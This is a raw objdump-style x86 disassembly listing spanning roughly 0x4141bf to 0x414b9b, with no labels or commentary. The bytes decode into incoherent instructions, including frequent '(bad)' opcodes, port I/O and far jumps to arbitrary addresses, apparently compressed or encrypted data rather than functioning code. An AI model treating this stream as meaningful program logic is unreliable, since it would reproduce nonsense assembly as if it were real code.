  4141bf:	nop
  4141c0:	ins    DWORD PTR es:[edi],dx
  4141c1:	xor    BYTE PTR [ebx],ah
  4141c3:	inc    eax
  4141c4:	jae    0x414158
  4141c6:	add    DWORD PTR [ebx+0x26],edx
  4141c9:	xor    DWORD PTR [edx-0x3f],edx
  4141cc:	pop    esp
  4141cd:	out    dx,al
  4141ce:	div    BYTE PTR [esi+edx*8-0x69]
  4141d2:	xchg   ebx,eax
  4141d3:	adc    ah,BYTE PTR [ecx]
  4141d5:	push   ebp
  4141d6:	dec    ebx
  4141d7:	gs adc al,0xc9
  4141da:	loope  0x41417f
  4141dc:	retf   0x29bb
  4141df:	xor    BYTE PTR [esi],dl
  4141e1:	in     al,dx
  4141e2:	mov    dh,0xc2
  4141e4:	cmp    DWORD PTR [esi-0x2786b540],ebx
  4141ea:	iret   
  4141eb:	sbb    eax,0xb8571043
  4141f0:	leave  
  4141f1:	les    edi,FWORD PTR [ebp+0x3e]
  4141f4:	data16 jmp 0x414213
  4141f7:	leave  
  4141f8:	cli    
  4141f9:	cld    
  4141fa:	cwde   
  4141fb:	add    DWORD PTR [edx],edx
  4141fd:	adc    ebx,DWORD PTR [ebp+0x4e]
  414200:	adc    al,0xb4
  414202:	cmp    eax,0xbebfc764
  414207:	inc    esi
  414208:	mov    WORD PTR [eax],ss
  41420a:	std    
  41420b:	cmc    
  41420c:	ja     0x4141c2
  41420e:	sbb    ch,bh
  414210:	test   esi,edx
  414212:	daa    
  414213:	mov    dl,0x58
  414215:	rcr    DWORD PTR [ebx+0x14],0x68
  414219:	inc    edx
  41421a:	or     eax,0xed9d114d
  41421f:	fstp   TBYTE PTR [eax+ecx*4-0x671efc9a]
  414226:	stos   BYTE PTR es:[edi],al
  414227:	test   eax,0x4f3ef5f0
  41422c:	jg     0x41425f
  41422e:	jbe    0x41429a
  414230:	(bad)  
  414231:	setne  BYTE PTR [ecx]
  414234:	xchg   ebx,eax
  414235:	xlat   BYTE PTR ds:[ebx]
  414236:	imul   BYTE PTR [esi]
  414238:	mov    al,ds:0xfd917273
  41423d:	fidivr DWORD PTR [eax-0x36]
  414240:	jecxz  0x41421f
  414242:	test   al,0x8f
  414244:	pop    eax
  414245:	mov    ebx,0x4b298889
  41424a:	outs   dx,BYTE PTR ds:[esi]
  41424b:	sbb    ch,BYTE PTR [ebp-0x38]
  41424e:	pusha  
  41424f:	test   eax,0x6091bba5
  414254:	sahf   
  414255:	stos   BYTE PTR es:[edi],al
  414256:	or     eax,0xc9fbcbd3
  41425b:	fdiv   st,st(5)
  41425d:	mov    ch,ah
  41425f:	mov    WORD PTR [eax+0x5b],?
  414262:	cmp    eax,0x6bb1baaf
  414267:	jl     0x4142ad
  414269:	and    al,0xcb
  41426b:	mov    ds:0xbf165d51,eax
  414270:	sub    WORD PTR [ebx+eax*1],di
  414274:	out    dx,eax
  414275:	jnp    0x4142a7
  414277:	loope  0x4142e4
  414279:	push   0xbb0cd310
  41427e:	jmp    0x414271
  414280:	and    bl,dl
  414282:	scas   eax,DWORD PTR es:[edi]
  414283:	(bad)  
  414284:	retf   
  414285:	pop    edi
  414286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414287:	mov    ah,dl
  414289:	inc    eax
  41428a:	jle    0x414295
  41428c:	scas   al,BYTE PTR es:[edi]
  41428d:	xlat   BYTE PTR ds:[ebx]
  41428e:	mov    dl,0x92
  414290:	or     ah,0x7e
  414293:	mov    dl,0xa
  414295:	cwde   
  414296:	ss popa 
  414298:	lods   eax,DWORD PTR ds:[esi]
  414299:	jb     0x4142cd
  41429b:	out    0x17,al
  41429d:	enter  0x8533,0x8c
  4142a1:	test   eax,0xb8c289fa
  4142a6:	dec    ecx
  4142a7:	pop    esi
  4142a8:	push   eax
  4142a9:	aad    0x41
  4142ab:	mov    edx,0x3f5c8f9
  4142b0:	adc    al,BYTE PTR [ecx+0xed1b04]
	...
  414316:	add    DWORD PTR [ecx-0x2122293],eax
  41431c:	mov    cl,0xdd
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0xc12eaf84
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    BYTE PTR [ecx],dl
  41432f:	push   0xffffffe1
  414331:	push   esi
  414332:	lahf   
  414333:	inc    esi
  414334:	call   DWORD PTR [edx+ecx*4-0x30]
  414338:	call   0x33ded9c2
  41433d:	pop    ebp
  41433e:	and    BYTE PTR [ebx+0x7],bh
  414341:	mov    dl,0x2e
  414343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414344:	jecxz  0x414388
  414346:	fild   QWORD PTR [ecx-0x6de43eab]
  41434c:	cmp    dl,cl
  41434e:	dec    edx
  41434f:	shr    DWORD PTR [ebp+edi*8+0x4ba8338e],0xfa
  414357:	(bad)  
  414358:	mov    ah,0xa3
  41435a:	mov    cl,0xaf
  41435c:	jmp    0xb05bdf7a
  414361:	push   0x6d585d
  414366:	jle    0x414398
  414368:	loop   0x41439b
  41436a:	mov    ebp,DWORD PTR [eax-0x60a223a1]
  414370:	adc    al,0x4c
  414372:	clc    
  414373:	push   esp
  414374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414375:	lds    edi,FWORD PTR [eax+eax*1-0x68]
  414379:	hlt    
  41437a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41437b:	add    cl,ah
  41437d:	sti    
  41437e:	out    dx,al
  41437f:	sub    BYTE PTR [eax+0xf],bh
  414382:	mov    DWORD PTR [ebx],0xa1f0ef03
  414388:	stos   DWORD PTR es:[edi],eax
  414389:	inc    edx
  41438a:	inc    esi
  41438b:	loop   0x41435e
  41438d:	xlat   BYTE PTR ds:[ebx]
  41438e:	sub    eax,0xfef0b531
  414393:	pop    es
  414394:	aas    
  414395:	mov    ds:0xf98559a6,eax
  41439a:	add    bh,bh
  41439c:	and    edi,DWORD PTR ds:0x29d2d964
  4143a2:	adc    eax,0x543d6513
  4143a7:	mov    cl,0x65
  4143a9:	xor    BYTE PTR [ecx+0x18f6b019],cl
  4143af:	or     edi,0xffffffb0
  4143b2:	sub    ecx,DWORD PTR [edx]
  4143b4:	sbb    BYTE PTR [ebp-0x5c],ah
  4143b7:	cld    
  4143b8:	(bad)  
  4143b9:	aam    0x9a
  4143bb:	hlt    
  4143bc:	mov    edi,db5
  4143bf:	jmp    0xf77:0x76bd1f4e
  4143c6:	mov    ch,BYTE PTR [esi+0x3cfdac0e]
  4143cc:	mov    ebp,DWORD PTR [ebx+0x74]
  4143cf:	dec    ebx
  4143d0:	cdq    
  4143d1:	out    0x18,al
  4143d3:	rcr    BYTE PTR [esi+0x5e],1
  4143d6:	test   BYTE PTR [ecx-0x3e],al
  4143d9:	ja     0x41443e
  4143db:	hlt    
  4143dc:	cld    
  4143dd:	inc    eax
  4143de:	call   0xd7fd:0xf75e9679
  4143e5:	js     0x414384
  4143e7:	(bad)  
  4143e8:	fsubr  QWORD PTR ds:0x3c0499f3
  4143ee:	hlt    
  4143ef:	add    eax,0x89732fc
  4143f4:	mov    cs,WORD PTR [ecx+0x433b8e11]
  4143fa:	jno    0x414466
  4143fc:	ror    BYTE PTR [esi+0x2a],cl
  4143ff:	jmp    FWORD PTR [ebx]
  414401:	ss call 0x806728de
  414407:	cmp    BYTE PTR [edx-0x2bd852b4],0x3c
  41440e:	and    eax,0x34b9771d
  414413:	scas   eax,DWORD PTR es:[edi]
  414414:	inc    edi
  414415:	loope  0x4143f2
  414417:	repz dec ecx
  414419:	dec    ebx
  41441a:	jb     0x4143af
  41441c:	cmp    eax,0x4be06928
  414421:	sub    ebx,ecx
  414423:	adc    DWORD PTR [ecx-0x1f],eax
  414426:	and    al,0xf2
  414428:	test   DWORD PTR [edx+0x63],0x96934186
  41442f:	sbb    dh,BYTE PTR [ecx-0x3b]
  414432:	scas   eax,DWORD PTR es:[edi]
  414433:	mov    al,ds:0x37
	...
  414494:	add    BYTE PTR [eax],al
  414496:	pop    ebx
  414497:	jae    0x4144db
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	mov    dh,BYTE PTR [ecx+0x5e]
  4144a5:	call   0x107:0xd309
  4144ac:	add    BYTE PTR [eax],al
  4144ae:	push   edx
  4144af:	movq   mm5,QWORD PTR [esi-0x20]
  4144b3:	(bad)  
  4144b4:	test   DWORD PTR es:[ecx+edi*2],eax
  4144b8:	sti    
  4144b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ba:	jo     0x414522
  4144bc:	add    edi,edi
  4144be:	jbe    0x41446a
  4144c0:	mov    BYTE PTR [esi+0x54],ch
  4144c3:	jmp    0x707a:0x98920d66
  4144ca:	push   ds
  4144cb:	mov    edx,0xb68a4316
  4144d0:	adc    eax,0x3c7c9245
  4144d5:	jmp    0xbb87:0xde840fa1
  4144dc:	dec    ecx
  4144dd:	sbb    eax,0x6d9a8e68
  4144e2:	call   0x62fd:0xc1dd5507
  4144e9:	scas   eax,DWORD PTR es:[edi]
  4144ea:	dec    esp
  4144eb:	xor    eax,DWORD PTR ds:0x6e5dd848
  4144f1:	imul   esp,DWORD PTR [ecx+0x62],0xfffffff0
  4144f5:	pusha  
  4144f6:	pusha  
  4144f7:	push   ebp
  4144f8:	pop    ds
  4144f9:	ret    
  4144fa:	psubusb mm7,mm6
  4144fd:	ja     0x414572
  4144ff:	pop    ebx
  414500:	mov    dh,0xef
  414502:	inc    ecx
  414503:	scas   eax,DWORD PTR es:[edi]
  414504:	(bad)  
  414505:	fsub   DWORD PTR [esi+0x23]
  414508:	xchg   DWORD PTR [ecx-0x6e1aea0],ecx
  41450e:	cs hlt 
  414510:	sub    dh,BYTE PTR [ebx+0x47360471]
  414516:	fs test eax,0x893f3e74
  41451c:	sub    eax,0x75f01495
  414521:	pop    ebp
  414522:	mov    bh,0xb2
  414524:	je     0x41452d
  414526:	ss or  edx,0x8c35e3fe
  41452d:	pop    eax
  41452e:	mov    bl,0x47
  414530:	test   al,0xd
  414532:	ret    
  414533:	jae    0x414508
  414535:	or     eax,0xf0846543
  41453b:	repz popa 
  41453d:	std    
  41453e:	fadd   DWORD PTR [ecx-0x4ef192fc]
  414544:	and    al,0x6d
  414546:	or     esp,edx
  414548:	pusha  
  414549:	mov    ecx,0x2295e080
  41454e:	fwait
  41454f:	sub    ecx,edx
  414551:	mov    edx,0x53dd19e6
  414556:	jmp    0x2105c36c
  41455b:	xor    DWORD PTR [ecx],esp
  41455d:	rcl    ch,1
  41455f:	push   esi
  414560:	push   edx
  414561:	dec    esi
  414562:	aad    0x35
  414564:	push   ecx
  414565:	in     eax,dx
  414566:	push   esi
  414568:	test   al,0xd3
  41456a:	mov    edx,0x7810f40f
  41456f:	cmp    eax,0x3a18ea20
  414574:	aas    
  414575:	and    al,0xbd
  414577:	rcr    DWORD PTR [ebx+edx*8],cl
  41457a:	not    DWORD PTR [eax-0x609c4995]
  414580:	jb     0x414579
  414582:	clc    
  414583:	rcl    esp,1
  414585:	je     0x4145ee
  414587:	push   0x271f4c21
  41458c:	fimul  WORD PTR [ebp+0x5142ed83]
  414592:	and    al,0xd9
  414594:	int3   
  414595:	adc    eax,0x85f199c7
  41459a:	cmc    
  41459b:	mov    eax,ds:0xfaa1fe52
  4145a0:	pop    edx
  4145a1:	push   esi
  4145a2:	or     DWORD PTR [eax],edi
  4145a4:	aaa    
  4145a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145a6:	outs   dx,BYTE PTR ds:[esi]
  4145a7:	out    0x7c,al
  4145a9:	(bad)  
  4145aa:	bound  ebp,QWORD PTR [ecx-0x7f]
  4145ad:	out    0xdf,al
  4145af:	sbb    al,0x6
  4145b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b2:	cmc    
  4145b3:	mov    bl,0xe4
	...
  414615:	add    BYTE PTR [edi+0x5e],bh
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0x623f0dc2
  414624:	mov    ch,0xa3
  414626:	adc    ah,dl
  414628:	add    BYTE PTR [eax],al
  41462a:	pop    es
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR [edx-0x7],bh
  414630:	adc    al,0x78
  414632:	cwde   
  414633:	dec    edx
  414634:	mov    al,ds:0x20925fc4
  414639:	jno    0x4145e1
  41463b:	xor    dl,BYTE PTR [eax+0x27f0a549]
  414641:	mov    ds:0xe39d8be2,eax
  414646:	push   ecx
  414647:	sub    BYTE PTR [edx+ebx*8-0x3e5b7d93],bl
  41464e:	pushf  
  41464f:	sar    BYTE PTR [edx+0x40],0x7a
  414653:	das    
  414654:	cld    
  414655:	rol    bl,cl
  414657:	outs   dx,BYTE PTR ds:[esi]
  414658:	into   
  414659:	push   esp
  41465a:	cmp    dl,dh
  41465c:	or     ch,BYTE PTR [esp+eax*8]
  41465f:	sub    esp,DWORD PTR [edi-0x2a]
  414662:	inc    ebx
  414663:	mov    DWORD PTR [edi-0x64],eax
  414666:	pop    ds
  414667:	push   edi
  414668:	icebp  
  414669:	sbb    DWORD PTR [esi-0x13],eax
  41466c:	shl    ebp,cl
  41466e:	nop
  41466f:	inc    eax
  414670:	sbb    dh,BYTE PTR [ebx]
  414672:	pushf  
  414673:	enter  0x8422,0x10
  414677:	mov    bh,0x3c
  414679:	cmp    esi,DWORD PTR [ebx+0x3a]
  41467c:	ficom  WORD PTR [edx-0x4b46c6ae]
  414682:	fidivr WORD PTR [ebx]
  414684:	sbb    bh,BYTE PTR [edi-0x445d10f6]
  41468a:	dec    esp
  41468b:	jmp    0x94d8d4a3
  414690:	outs   dx,BYTE PTR ds:[esi]
  414691:	jle    0x414656
  414693:	push   es
  414694:	sbb    BYTE PTR [esi+0x7b],dl
  414697:	cmp    ebp,DWORD PTR [si]
  41469a:	inc    ecx
  41469b:	mov    dh,BYTE PTR [ecx+0x7f]
  41469e:	mov    al,ds:0x8b8801d9
  4146a3:	ret    
  4146a4:	ss mov ecx,0x9f781cc5
  4146aa:	iret   
  4146ab:	test   BYTE PTR [ebx],dh
  4146ad:	and    BYTE PTR [ebp-0x17],bh
  4146b0:	sbb    DWORD PTR [ecx+eax*2+0x701c03d1],0x2c976617
  4146bb:	repz xlat BYTE PTR ds:[ebx]
  4146bd:	sub    BYTE PTR [edx-0x2b],dl
  4146c0:	push   esp
  4146c1:	pop    ebp
  4146c2:	mov    eax,ds:0xfd215169
  4146c7:	lds    eax,FWORD PTR [edi+0x38]
  4146ca:	jb     0x414668
  4146cc:	mov    bh,0x40
  4146ce:	pop    ecx
  4146cf:	lea    esp,[esi]
  4146d1:	adc    cl,BYTE PTR [ecx-0x31]
  4146d4:	xchg   esi,eax
  4146d5:	inc    edi
  4146d6:	test   DWORD PTR ds:0x61cdbae0,edi
  4146dc:	xchg   ecx,eax
  4146dd:	pushf  
  4146de:	(bad)  
  4146df:	repz xlat BYTE PTR ds:[ebx]
  4146e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146e2:	cmp    BYTE PTR [ebp+0x43],ah
  4146e5:	push   es
  4146e6:	cmp    eax,0x8c68a70
  4146eb:	out    0xa6,al
  4146ed:	push   ebp
  4146ee:	loopne 0x4146a9
  4146f0:	or     eax,0x9c9381a1
  4146f5:	mov    ds:0x812b3196,al
  4146fa:	pop    edi
  4146fb:	out    dx,al
  4146fc:	fsub   DWORD PTR [edx+0x159b35b6]
  414702:	sgdtd  [ebx]
  414705:	icebp  
  414706:	outs   dx,BYTE PTR ds:[esi]
  414707:	das    
  414708:	mov    eax,0x960484c0
  41470d:	pop    ds
  41470e:	daa    
  41470f:	fadd   DWORD PTR [edx]
  414711:	sub    eax,DWORD PTR [ebx]
  414713:	sub    bh,BYTE PTR ds:0xa775983a
  414719:	jg     0x4146cc
  41471b:	mov    cs,WORD PTR [edx+0x13]
  41471e:	lea    edx,[ebx]
  414720:	mov    cl,0x2f
  414722:	outs   dx,DWORD PTR ds:[esi]
  414723:	icebp  
  414724:	int3   
  414725:	cdq    
  414726:	scas   eax,DWORD PTR es:[edi]
  414727:	xor    ebx,DWORD PTR fs:[esi-0x1dd7dd4d]
  41472e:	call   0xbe6ffc4b
  414733:	xchg   DWORD PTR [esi+0x0],esp
	...
  414796:	jle    0x4147c7
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	outs   dx,DWORD PTR ds:[esi]
  4147a3:	dec    ebp
  4147a4:	retf   0x17b8
  4147a7:	aad    0x0
  4147a9:	add    BYTE PTR [edi],al
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [edi+0x3c],dh
  4147b0:	mov    esp,0xbd3e96bd
  4147b5:	sbb    al,0x27
  4147b7:	leave  
  4147b8:	or     BYTE PTR [esi-0x60],cl
  4147bb:	fdivrp st(4),st
  4147bd:	pop    ebp
  4147be:	and    DWORD PTR [ebx],ebx
  4147c0:	call   0x3790:0x11f32492
  4147c7:	jg     0x414751
  4147c9:	pop    ss
  4147ca:	add    al,0xb1
  4147cc:	std    
  4147cd:	call   0xe5f1dd5c
  4147d2:	imul   eax,DWORD PTR [ebx-0x316e76e1],0x5d
  4147d9:	outs   dx,DWORD PTR ds:[esi]
  4147da:	cmc    
  4147db:	adc    BYTE PTR [edi],0xd3
  4147de:	js     0x4147a4
  4147e0:	sub    DWORD PTR [ebp+0x8],ecx
  4147e3:	xor    dl,BYTE PTR [edx+0x11]
  4147e6:	bound  esp,QWORD PTR [edi-0x52]
  4147e9:	scas   al,BYTE PTR es:[edi]
  4147ea:	adc    dl,bh
  4147ec:	dec    esi
  4147ed:	mov    ebp,0x80cc3faa
  4147f2:	scas   eax,DWORD PTR es:[edi]
  4147f3:	push   edi
  4147f4:	clc    
  4147f5:	cwde   
  4147f6:	pop    ecx
  4147f7:	xchg   edi,eax
  4147f8:	and    BYTE PTR [ebp-0x6b306b80],ch
  4147fe:	xchg   ebx,eax
  4147ff:	sub    ch,dl
  414801:	outs   dx,DWORD PTR ds:[esi]
  414802:	fimul  DWORD PTR [eax-0x46e396a5]
  414808:	mov    edi,0x52b4068
  41480d:	push   ss
  41480e:	xor    edx,DWORD PTR [edx]
  414810:	icebp  
  414811:	cmp    cl,al
  414813:	push   ebx
  414814:	xor    ecx,DWORD PTR [eax]
  414816:	xchg   ebp,eax
  414817:	xor    esp,edi
  414819:	pusha  
  41481a:	mov    ch,0x80
  41481c:	mov    edx,0xc34ec208
  414821:	and    BYTE PTR [edi+0x4860e128],bl
  414827:	add    dh,BYTE PTR [ecx-0x70]
  41482a:	inc    edx
  41482b:	sub    BYTE PTR [edi],ah
  41482d:	bound  esp,QWORD PTR [esi+0x7a13d72]
  414833:	pushf  
  414834:	(bad)  
  414835:	mov    cl,0xc0
  414837:	cld    
  414838:	and    al,0x54
  41483a:	sub    al,0x92
  41483c:	test   al,0xe
  41483e:	sbb    esi,DWORD PTR [edi+0x15186d9d]
  414844:	push   eax
  414845:	push   ebx
  414846:	ja     0x4147f0
  414848:	and    ch,bh
  41484a:	fild   DWORD PTR [esi]
  41484c:	and    eax,0xbfd23fbe
  414851:	int    0xed
  414853:	fsub   QWORD PTR [edi+0x6b]
  414856:	dec    ebx
  414857:	popf   
  414858:	xchg   ebx,eax
  414859:	or     BYTE PTR [ebx+ecx*4-0x3d],bh
  41485d:	cwde   
  41485e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41485f:	sahf   
  414860:	mov    ds:0x692cc0f7,eax
  414865:	aas    
  414866:	retf   
  414867:	or     eax,0x1d71c207
  41486c:	xchg   esp,eax
  41486d:	sub    ecx,DWORD PTR [edx]
  41486f:	cmp    DWORD PTR [ecx+0x34],esp
  414872:	out    dx,al
  414873:	cli    
  414874:	arpl   WORD PTR [esi+0x38b17ab],si
  41487a:	popf   
  41487b:	jne    0x41480e
  41487d:	and    al,0x23
  41487f:	loope  0x41488b
  414881:	fcomip st,st(7)
  414883:	pop    es
  414884:	sbb    cl,BYTE PTR [eax+0x38]
  414887:	inc    esp
  414888:	(bad)  
  414889:	neg    BYTE PTR [ebp+0x55]
  41488c:	shl    DWORD PTR [edx-0x659a5b15],cl
  414892:	inc    edi
  414893:	inc    edx
  414894:	push   ebp
  414895:	mov    ebp,0x786d03cc
  41489a:	sub    BYTE PTR [eax],dh
  41489c:	scas   eax,DWORD PTR es:[edi]
  41489d:	adc    ah,dl
  41489f:	cmp    bl,BYTE PTR [ebx-0x31]
  4148a2:	je     0x41486f
  4148a4:	pop    ecx
  4148a5:	mov    esp,ecx
  4148a7:	pop    edi
  4148a8:	addr16 iret 
  4148aa:	add    eax,eax
  4148ac:	stos   BYTE PTR es:[edi],al
  4148ad:	rcr    BYTE PTR [edx],cl
  4148af:	mov    bh,0x20
  4148b1:	cwde   
  4148b2:	fbstp  TBYTE PTR [edx]
  4148b4:	xchg   ebx,eax
	...
  414915:	add    BYTE PTR [ebx],cl
  414917:	jle    0x4148eb
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0xc8b7c1ed
  414924:	and    ah,BYTE PTR [edi]
  414926:	push   ds
  414927:	(bad)  
  414928:	add    BYTE PTR [eax],al
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [eax-0x4f],bl
  414930:	pop    ebx
  414931:	lock xchg BYTE PTR [ecx-0x694562d],dl
  414938:	sub    edi,DWORD PTR [ebp+ebx*4+0x13]
  41493c:	call   0x424a:0xdada17dc
  414943:	jne    0x414958
  414945:	pop    ss
  414946:	out    0x5,eax
  414948:	or     DWORD PTR [edx-0x682c3067],0x56
  41494f:	pop    ebp
  414950:	dec    edx
  414951:	arpl   WORD PTR [ebx+0x48],cx
  414954:	mov    eax,0xe1858afa
  414959:	scas   al,BYTE PTR es:[edi]
  41495a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41495b:	test   eax,0x4d5a28e9
  414960:	cdq    
  414961:	or     bl,ch
  414963:	cmp    eax,0xa2eae84
  414968:	fmul   st,st(7)
  41496a:	es inc ebp
  41496c:	(bad)  
  41496e:	aad    0x56
  414970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414971:	sub    ch,0x2c
  414974:	mov    edi,0x51f9baa9
  414979:	(bad)  
  41497a:	clc    
  41497b:	ret    0xc99d
  41497e:	cmp    esp,esp
  414980:	xor    eax,0x9721ec32
  414985:	mov    ecx,DWORD PTR [esi+0x3c]
  414988:	cmp    edi,ebp
  41498a:	repz mov ?,WORD PTR [ebx]
  41498d:	or     ch,cl
  41498f:	sbb    BYTE PTR [eax],cl
  414991:	mov    esi,0x99d21a12
  414996:	jnp    0x414a12
  414998:	pusha  
  414999:	les    esi,FWORD PTR [ebp+0x3af1f757]
  41499f:	ret    
  4149a0:	mov    dh,0xb0
  4149a2:	cli    
  4149a3:	push   edi
  4149a4:	sbb    bl,bl
  4149a6:	cmp    al,0xca
  4149a8:	fstp   QWORD PTR [ebp-0x7]
  4149ab:	dec    eax
  4149ac:	and    eax,0xdc2dbee2
  4149b1:	jb     0x414949
  4149b3:	pop    esi
  4149b4:	adc    ebp,DWORD PTR [edx+0x5c]
  4149b7:	lods   al,BYTE PTR ds:[esi]
  4149b8:	stc    
  4149b9:	pop    eax
  4149ba:	mov    DWORD PTR [edx+ebx*4],edx
  4149bd:	addr16 enter 0x96f2,0x85
  4149c2:	in     eax,dx
  4149c3:	ins    DWORD PTR es:[edi],dx
  4149c4:	ss aas 
  4149c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149c7:	call   0x5e462ce3
  4149cc:	jp     0x4149a0
  4149ce:	adc    ch,BYTE PTR [ebx-0x43]
  4149d1:	or     BYTE PTR [eax+eax*1-0x2e],dl
  4149d5:	hlt    
  4149d6:	jno    0x414a3e
  4149d8:	jge    0x414a4b
  4149da:	ins    BYTE PTR es:[edi],dx
  4149db:	dec    edi
  4149dc:	pop    ebp
  4149dd:	push   0xa9ca15bf
  4149e2:	jmp    0x5bda128
  4149e7:	ins    DWORD PTR es:[edi],dx
  4149e8:	rol    edi,0xcb
  4149eb:	and    BYTE PTR [eax-0x5ffea963],0x66
  4149f2:	push   cs
  4149f3:	dec    edi
  4149f4:	mov    esp,0xc504805c
  4149f9:	mov    ds:0xa5f990ee,eax
  4149fe:	loopne 0x4149c8
  414a00:	inc    edi
  414a01:	xor    al,BYTE PTR [ebx+0x15]
  414a04:	xchg   ebp,eax
  414a05:	mov    edx,0x15f203f1
  414a0a:	sbb    al,0xd4
  414a0c:	pusha  
  414a0d:	cmp    edx,esp
  414a0f:	push   eax
  414a10:	dec    ebp
  414a11:	mov    edi,0x5811e358
  414a16:	ds inc eax
  414a18:	je     0x4149ba
  414a1a:	xor    eax,0xa16495d8
  414a1f:	inc    edx
  414a20:	shl    DWORD PTR [ebx],0xda
  414a23:	jg     0x4149d1
  414a25:	lds    esp,FWORD PTR gs:[ecx-0x10]
  414a29:	mov    dh,0xae
  414a2b:	test   DWORD PTR ds:0xedf5fb64,eax
  414a31:	pop    eax
  414a32:	idiv   BYTE PTR [esi+0x7a]
	...
  414a95:	add    BYTE PTR [edi+0x7e363ed9],bl
  414a9b:	neg    DWORD PTR [edi-0x4d9bdb07]
  414aa1:	sbb    ebp,DWORD PTR [ebp+0x25e08a11]
  414aa7:	xlat   BYTE PTR ds:[ebx]
  414aa8:	add    BYTE PTR [eax],al
  414aaa:	pop    es
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [ebx-0x3f],dh
  414ab0:	adc    al,0xe
  414ab2:	in     eax,dx
  414ab3:	call   0xd021a484
  414ab8:	hlt    
  414ab9:	add    ebx,DWORD PTR [eax+0x33]
  414abc:	retf   
  414abd:	and    eax,0x59b8a02f
  414ac2:	(bad)
  414ac5:	inc    ecx
  414ac6:	and    eax,DWORD PTR [eax]
  414ac8:	adc    BYTE PTR [eax-0x79],ch
  414acb:	test   al,0x86
  414acd:	cwde   
  414ace:	in     eax,dx
  414acf:	inc    ecx
  414ad0:	sbb    eax,0x2b95a3a4
  414ad5:	test   DWORD PTR [edx+0x63],ebp
  414ad8:	jno    0x414b2c
  414ada:	push   ebp
  414adb:	sbb    BYTE PTR [ebp+0x539a4079],ch
  414ae1:	test   BYTE PTR ds:0x8c66fa78,dl
  414ae7:	(bad)  
  414ae8:	push   es
  414ae9:	adc    ecx,DWORD PTR [ecx-0x5e]
  414aec:	div    DWORD PTR ds:0xd5333c42
  414af2:	push   0x3160fe4b
  414af7:	clc    
  414af8:	mov    ds:0x9d2af4ea,al
  414afd:	lock dec ebp
  414aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b00:	and    DWORD PTR [esi-0x516b5349],ebp
  414b06:	cmp    DWORD PTR [ecx+0xa36e15e],0x26
  414b0d:	not    bh
  414b0f:	arpl   WORD PTR [ecx],ax
  414b11:	dec    ebp
  414b12:	adc    DWORD PTR [eax+0x6919ef0b],ebp
  414b18:	ret    0xa388
  414b1b:	inc    esp
  414b1c:	inc    ebp
  414b1d:	sub    BYTE PTR [edx],dh
  414b1f:	sub    dl,BYTE PTR [ebx]
  414b21:	repz ret 
  414b23:	add    cl,dh
  414b25:	std    
  414b26:	retf   0x5b5d
  414b29:	cmp    al,BYTE PTR [ebp-0x7ef9f83b]
  414b2f:	jae    0x414b97
  414b31:	mov    ch,ah
  414b33:	imul   ecx,DWORD PTR [ecx-0x562b7612],0xd8d03e66
  414b3d:	xor    edx,DWORD PTR [esi]
  414b3f:	pop    ds
  414b40:	sbb    BYTE PTR [edi],cl
  414b42:	and    DWORD PTR [esi+eax*8+0x4026bbce],ecx
  414b49:	arpl   WORD PTR [eax-0x1eacdf9e],ax
  414b4f:	xchg   ax,cx
  414b52:	(bad)  
  414b53:	scas   al,BYTE PTR es:[edi]
  414b54:	clc    
  414b55:	pop    ebp
  414b56:	in     al,dx
  414b57:	and    dl,al
  414b59:	xchg   edi,eax
  414b5a:	lds    edx,FWORD PTR [ebp-0x30]
  414b5d:	pop    edi
  414b5e:	(bad)  
  414b5f:	mov    bh,0x87
  414b61:	fdiv   st(2),st
  414b63:	idiv   BYTE PTR [ebx+0x4c]
  414b66:	pop    es
  414b67:	ins    DWORD PTR es:[edi],dx
  414b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b69:	rol    DWORD PTR ds:0x5274899b,1
  414b6f:	icebp  
  414b70:	jbe    0x414b5a
  414b72:	xchg   ecx,eax
  414b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b74:	push   edi
  414b75:	lods   al,BYTE PTR ds:[esi]
  414b76:	out    dx,al
  414b77:	aam    0x77
  414b79:	jbe    0x414be9
  414b7b:	or     DWORD PTR ds:0x4cde7534,esi
  414b81:	jge    0x414b66
  414b83:	fisubr DWORD PTR [esi+0x227530b6]
  414b89:	xor    BYTE PTR [edx],0x1d
  414b8c:	cld    
  414b8d:	cwde   
  414b8e:	addr16 dec ebx
  414b90:	xchg   ecx,eax
  414b91:	lds    edi,FWORD PTR [ebp-0x688af2dc]
  414b97:	jecxz  0x414b72
  414b99:	(bad)  
  414b9a:	xchg   esi,eax
  414b9b:	push   ebp
